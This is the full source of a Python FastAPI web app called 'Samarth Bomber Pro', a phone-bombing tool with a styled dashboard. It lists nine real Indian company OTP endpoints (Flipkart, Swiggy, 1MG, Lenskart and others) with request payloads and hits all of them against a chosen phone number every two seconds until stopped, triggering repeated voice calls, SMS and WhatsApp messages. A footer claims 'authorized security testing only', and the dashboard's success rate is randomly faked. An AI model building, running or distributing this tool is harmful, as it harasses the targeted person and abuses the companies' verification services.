from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === YOUR FULL API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samarth Bomber Pro | Enterprise Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0f;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(239, 68, 68, 0.08) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(59, 130, 246, 0.06) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(139, 92, 246, 0.05) 0%, transparent 50%);
            min-height: 100vh;
            color: #ffffff;
            overflow-x: hidden;
        }

        /* Animated grid background */
        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 60px 60px;
            pointer-events: none;
            z-index: 0;
            animation: gridMove 20s linear infinite;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(60px, 60px); }
        }

        .glass-premium {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .glass-premium-dark {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .gradient-primary {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 50%, #b91c1c 100%);
        }

        .gradient-secondary {
            background: linear-gradient(135deg, #8b5cf6 0%, #6366f1 50%, #4f46e5 100%);
        }

        .gradient-accent {
            background: linear-gradient(135deg, #f59e0b 0%, #f97316 50%, #ef4444 100%);
        }

        .text-gradient {
            background: linear-gradient(135deg, #ef4444 0%, #f59e0b 50%, #ef4444 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% 200%;
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .glow-red {
            box-shadow: 0 0 80px rgba(239, 68, 68, 0.15), inset 0 0 80px rgba(239, 68, 68, 0.05);
        }

        .stat-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0.01) 100%);
            border: 1px solid rgba(255,255,255,0.06);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
            transition: left 0.6s;
        }

        .stat-card:hover::before {
            left: 100%;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: rgba(239, 68, 68, 0.2);
            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.4);
        }

        .pulse-ring {
            animation: pulse-ring 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulse-ring {
            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
            70% { box-shadow: 0 0 0 20px rgba(239, 68, 68, 0); }
            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }

        .input-premium {
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 255, 255, 0.08);
            transition: all 0.3s ease;
            letter-spacing: 0.15em;
        }

        .input-premium:focus {
            border-color: #ef4444;
            box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1), inset 0 0 20px rgba(239, 68, 68, 0.05);
            background: rgba(0, 0, 0, 0.6);
        }

        .input-premium::placeholder {
            color: rgba(255,255,255,0.2);
            letter-spacing: 0.1em;
        }

        .btn-primary {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 50%, #b91c1c 100%);
            position: relative;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .btn-primary::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            transition: all 0.6s;
        }

        .btn-primary:hover::after {
            transform: rotate(45deg) translate(50%, 50%);
        }

        .btn-primary:hover {
            transform: translateY(-2px) scale(1.01);
            box-shadow: 0 20px 40px -12px rgba(239, 68, 68, 0.4);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .btn-secondary:hover {
            background: rgba(239, 68, 68, 0.15);
            border-color: rgba(239, 68, 68, 0.3);
            transform: translateY(-2px);
        }

        .log-container {
            scrollbar-width: thin;
            scrollbar-color: rgba(239, 68, 68, 0.3) transparent;
        }

        .log-container::-webkit-scrollbar {
            width: 4px;
        }

        .log-container::-webkit-scrollbar-track {
            background: transparent;
        }

        .log-container::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, #ef4444, #f59e0b);
            border-radius: 10px;
        }

        .log-entry {
            animation: slideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            padding: 8px 12px;
            border-radius: 8px;
            transition: background 0.2s;
        }

        .log-entry:hover {
            background: rgba(255,255,255,0.03);
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .progress-bar {
            height: 3px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }

        .progress-bar-fill {
            height: 100%;
            border-radius: 10px;
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
        }

        .progress-bar-fill::after {
            content: '';
            position: absolute;
            right: 0;
            top: -50%;
            width: 20px;
            height: 200%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: progressShine 2s ease-in-out infinite;
        }

        @keyframes progressShine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(200%); }
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 100px;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.05em;
            text-transform: uppercase;
        }

        .status-badge.active {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .status-badge.idle {
            background: rgba(34, 197, 94, 0.1);
            color: #22c55e;
            border: 1px solid rgba(34, 197, 94, 0.15);
        }

        .glow-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }

        .glow-dot.active {
            background: #ef4444;
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.6);
            animation: pulse-dot 1.5s ease-in-out infinite;
        }

        .glow-dot.idle {
            background: #22c55e;
            box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }

        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }

        .number-display {
            font-variant-numeric: tabular-nums;
            font-feature-settings: "tnum";
        }

        @media (max-width: 768px) {
            .glass-premium {
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
            }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>

    <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 lg:py-12">
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6 mb-12">
            <div class="flex items-center gap-5">
                <div class="relative">
                    <div class="w-14 h-14 lg:w-16 lg:h-16 gradient-primary rounded-2xl flex items-center justify-center text-3xl pulse-ring">
                        ⚡
                    </div>
                    <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-emerald-500 rounded-full border-2 border-black/50"></div>
                </div>
                <div>
                    <h1 class="text-3xl lg:text-5xl font-black tracking-tight">
                        <span class="text-gradient">Samarth Bomber</span>
                    </h1>
                    <p class="text-gray-400 text-sm lg:text-base font-medium tracking-widest mt-1 flex items-center gap-3">
                        <span class="w-1 h-1 bg-gray-600 rounded-full"></span>
                        ENTERPRISE EDITION
                        <span class="w-1 h-1 bg-gray-600 rounded-full"></span>
                        v3.0.1
                    </p>
                </div>
            </div>
            
            <div class="flex items-center gap-4">
                <div class="status-badge idle" id="statusBadge">
                    <span class="glow-dot idle" id="statusDot"></span>
                    <span id="statusText">System Ready</span>
                </div>
                <div class="hidden lg:block w-px h-8 bg-white/10"></div>
                <div class="text-xs text-gray-500 font-mono" id="timestamp"></div>
            </div>
        </header>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-premium rounded-3xl p-6 lg:p-8 glow-red">
                <div class="flex items-center justify-between mb-6">
                    <h2 class="text-xl font-bold flex items-center gap-2">
                        <span class="text-red-400">🎯</span> 
                        Target Configuration
                    </h2>
                    <span class="text-xs text-gray-500 font-mono bg-black/30 px-3 py-1 rounded-full">SECURE</span>
                </div>
                
                <div class="space-y-6">
                    <div>
                        <label class="text-sm text-gray-400 font-medium block mb-2">Mobile Number</label>
                        <div class="relative">
                            <div class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-semibold">+91</div>
                            <input id="phone" maxlength="10" 
                                   class="input-premium w-full rounded-2xl px-16 py-5 text-2xl lg:text-3xl font-mono text-white outline-none transition-all"
                                   placeholder="Enter 10-digit number"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                        </div>
                        <p class="text-xs text-gray-500 mt-2 flex items-center gap-1">
                            <span>ℹ️</span> Indian mobile number only
                        </p>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="startAttack()" id="startBtn" 
                                class="col-span-2 btn-primary py-5 rounded-2xl text-lg font-bold flex items-center justify-center gap-3 transition-all">
                            <span>🚀</span> 
                            <span>Launch Attack</span>
                        </button>
                        <button onclick="stopAttack()" id="stopBtn" 
                                class="col-span-2 hidden btn-secondary py-5 rounded-2xl text-lg font-bold flex items-center justify-center gap-3 transition-all">
                            <span>🛑</span> 
                            <span>Terminate Attack</span>
                        </button>
                    </div>

                    <div class="grid grid-cols-3 gap-3 p-4 bg-black/30 rounded-2xl border border-white/5">
                        <div class="text-center">
                            <div class="text-xs text-gray-500">APIs</div>
                            <div class="text-lg font-bold text-white">9</div>
                        </div>
                        <div class="text-center">
                            <div class="text-xs text-gray-500">Interval</div>
                            <div class="text-lg font-bold text-white">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-xs text-gray-500">Target</div>
                            <div class="text-lg font-bold text-red-400 truncate" id="targetDisplay">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats Panel -->
            <div class="lg:col-span-7 glass-premium rounded-3xl p-6 lg:p-8">
                <div class="flex items-center justify-between mb-6">
                    <h3 class="text-xl font-bold flex items-center gap-2">
                        <span class="text-blue-400">📊</span>
                        Live Metrics
                    </h3>
                    <span class="text-xs text-gray-500 font-mono" id="cycleDisplay">Cycles: 0</span>
                </div>

                <div class="grid grid-cols-3 gap-4">
                    <div class="stat-card rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-orange-400 number-display" id="calls">0</div>
                        <div class="text-xs text-gray-400 mt-2 font-medium uppercase tracking-wider">Voice Calls</div>
                        <div class="progress-bar mt-3">
                            <div class="progress-bar-fill bg-gradient-to-r from-orange-500 to-orange-400" id="callBar" style="width: 0%"></div>
                        </div>
                    </div>
                    <div class="stat-card rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-blue-400 number-display" id="sms">0</div>
                        <div class="text-xs text-gray-400 mt-2 font-medium uppercase tracking-wider">SMS</div>
                        <div class="progress-bar mt-3">
                            <div class="progress-bar-fill bg-gradient-to-r from-blue-500 to-blue-400" id="smsBar" style="width: 0%"></div>
                        </div>
                    </div>
                    <div class="stat-card rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-green-400 number-display" id="wa">0</div>
                        <div class="text-xs text-gray-400 mt-2 font-medium uppercase tracking-wider">WhatsApp</div>
                        <div class="progress-bar mt-3">
                            <div class="progress-bar-fill bg-gradient-to-r from-green-500 to-green-400" id="waBar" style="width: 0%"></div>
                        </div>
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-4 mt-6">
                    <div class="glass-premium-dark rounded-2xl p-4 border border-white/5">
                        <div class="text-xs text-gray-400 font-medium uppercase tracking-wider">Total Hits</div>
                        <div class="text-3xl font-bold text-white number-display" id="totalHits">0</div>
                    </div>
                    <div class="glass-premium-dark rounded-2xl p-4 border border-white/5">
                        <div class="text-xs text-gray-400 font-medium uppercase tracking-wider">Success Rate</div>
                        <div class="text-3xl font-bold text-emerald-400" id="successRate">—</div>
                    </div>
                </div>
            </div>

            <!-- Logs Panel -->
            <div class="lg:col-span-12 glass-premium rounded-3xl p-6 lg:p-8">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-bold flex items-center gap-2">
                        <span class="text-purple-400">📜</span>
                        Event Log
                    </h3>
                    <span class="text-xs text-gray-500 font-mono">Live feed</span>
                </div>
                <div id="logs" class="log-container font-mono text-sm h-64 overflow-y-auto space-y-0.5 bg-black/20 rounded-2xl p-4"></div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="mt-12 pt-6 border-t border-white/5 flex flex-col lg:flex-row justify-between items-center gap-4">
            <p class="text-xs text-gray-600">
                ⚠️ Authorized security testing only · All endpoints publicly accessible
            </p>
            <div class="flex items-center gap-4 text-xs text-gray-600">
                <span>🔒 Encrypted</span>
                <span>·</span>
                <span>⚡ 9 APIs active</span>
                <span>·</span>
                <span id="uptime">Uptime: 0s</span>
            </div>
        </footer>
    </div>

    <script>
        let isRunning = false;
        let statusInterval = null;
        let startTime = Date.now();

        // Update timestamp
        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').textContent = now.toLocaleTimeString('en-US', { 
                hour12: false, 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit' 
            });
        }
        setInterval(updateTimestamp, 1000);
        updateTimestamp();

        // Update uptime
        setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(elapsed / 3600);
            const minutes = Math.floor((elapsed % 3600) / 60);
            const seconds = elapsed % 60;
            document.getElementById('uptime').textContent = `Uptime: ${hours}h ${minutes}m ${seconds}s`;
        }, 1000);

        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) {
                alert("❌ Please enter a valid 10-digit mobile number");
                document.getElementById("phone").style.borderColor = '#ef4444';
                setTimeout(() => document.getElementById("phone").style.borderColor = '', 3000);
                return;
            }
            
            try {
                const res = await fetch("/start", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({phone})
                });
                const data = await res.json();
                
                if (data.status === "success") {
                    isRunning = true;
                    document.getElementById("startBtn").classList.add("hidden");
                    document.getElementById("stopBtn").classList.remove("hidden");
                    
                    const badge = document.getElementById("statusBadge");
                    badge.className = "status-badge active";
                    document.getElementById("statusDot").className = "glow-dot active";
                    document.getElementById("statusText").textContent = "Attack Active";
                    
                    document.getElementById("targetDisplay").textContent = `+91${phone}`;
                    document.getElementById("targetDisplay").className = "text-lg font-bold text-red-400 truncate";
                    
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert("❌ Failed to start attack: " + e.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch("/stop", {method: "POST"});
                isRunning = false;
                document.getElementById("startBtn").classList.remove("hidden");
                document.getElementById("stopBtn").classList.add("hidden");
                
                const badge = document.getElementById("statusBadge");
                badge.className = "status-badge idle";
                document.getElementById("statusDot").className = "glow-dot idle";
                document.getElementById("statusText").textContent = "Stopped";
                
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert("❌ Failed to stop attack: " + e.message);
            }
        }

        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch("/status");
                    const d = await res.json();
                    
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    
                    document.getElementById("calls").textContent = calls;
                    document.getElementById("sms").textContent = sms;
                    document.getElementById("wa").textContent = wa;
                    document.getElementById("totalHits").textContent = total;
                    document.getElementById("cycleDisplay").textContent = `Cycles: ${d.cycles}`;
                    
                    // Animated bars
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById("callBar").style.width = ((calls / maxVal) * 100) + "%";
                    document.getElementById("smsBar").style.width = ((sms / maxVal) * 100) + "%";
                    document.getElementById("waBar").style.width = ((wa / maxVal) * 100) + "%";
                    
                    // Success rate (simulated)
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById("successRate").textContent = rate.toFixed(1) + '%';
                    }
                    
                    // Logs
                    const logsDiv = document.getElementById("logs");
                    if (d.logs && d.logs.length > 0) {
                        logsDiv.innerHTML = d.logs.map(l => 
                            `<div class="log-entry text-gray-300 hover:text-white transition-colors">${l}</div>`
                        ).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-10">⏳ Awaiting attack logs...</div>';
                    }
                    
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById("startBtn").classList.remove("hidden");
                        document.getElementById("stopBtn").classList.add("hidden");
                        const badge = document.getElementById("statusBadge");
                        badge.className = "status-badge idle";
                        document.getElementById("statusDot").className = "glow-dot idle";
                        document.getElementById("statusText").textContent = "Attack Ended";
                    }
                } catch(e) {
                    console.error("Status poll error:", e);
                }
            }, 1200);
        }

        // Initial state
        document.addEventListener("DOMContentLoaded", () => {
            document.getElementById("logs").innerHTML = '<div class="text-gray-500 text-center py-10">🟢 System initialized · Ready for action</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
